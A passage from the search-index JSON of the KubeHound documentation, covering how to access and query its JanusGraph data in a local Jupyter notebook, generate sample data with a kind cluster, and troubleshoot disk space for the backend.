(id=01j4fwbg88j6eptasgegdh2sgs) complete in 15.910406167s\nWARN[01:43:36] KubeHound as finished ingesting and building the graph successfully.\nWARN[01:43:36] Please visit the UI to view the graph by clicking the link below:\nWARN[01:43:36] http://localhost:8888\nWARN[01:43:36] Password being 'admin'\n</code></pre>"},{"location":"user-guide/getting-started/#access-the-kubehound-data","title":"Access the KubeHound data","text":"<p>At this point, the KubeHound data has been ingested in KubeHound's graph database. You can use any client that supports accessing JanusGraph - a comprehensive list is available on the JanusGraph home page. We also provide a showcase Jupyter Notebook to get you started. This is accessible on http://localhost:8888 after starting KubeHound backend. The default password is <code>admin</code> but you can change this by setting the <code>NOTEBOOK_PASSWORD</code> environment variable in your <code>.env file</code>.</p>"},{"location":"user-guide/getting-started/#visualize-and-query-the-kubehound-data","title":"Visualize and query the KubeHound data","text":"<p>Note</p> <p>You can find the visual representation of the KubeHound graph model here.</p> <p>Once the data is loaded in the graph database, it's time to visualize and query it!</p> <p>You can explore it interactively in your graph client. Then, refer to KubeHound's query library to start asking questions to your data.</p>"},{"location":"user-guide/getting-started/#generating-sample-data","title":"Generating sample data","text":"<p>If you don't have a cluster at your disposal: clone the KubeHound repository, install kind and run the following command:</p> <pre><code>make sample-graph\n</code></pre> <p>This will spin up a temporary local kind cluster, run KubeHound on it, and destroy the cluster.</p>"},{"location":"user-guide/troubleshooting/","title":"Troubleshooting Guide","text":""},{"location":"user-guide/troubleshooting/#backend-issues","title":"Backend Issues","text":"<p>The most common issues can usually be resolved by restarting the backend. See Common Operations</p>"},{"location":"user-guide/troubleshooting/#janusgraph-kubegraph-container-wont-start","title":"Janusgraph (kubegraph container) won't start","text":"<p>Make sure you have enough disk space. About 5GB is necessary for JanusGraph to start and ingest a (large) Kubernetes cluster data.</p> <p>On Linux, and if you have a \"strongly\" partitioned system, you should make sure your Docker setup has enough space available, one quick check can be done with: <pre><code>df $(docker info| grep \"Root Dir\" | cut -d\":\" -f2)\n</code></pre></p>"}]}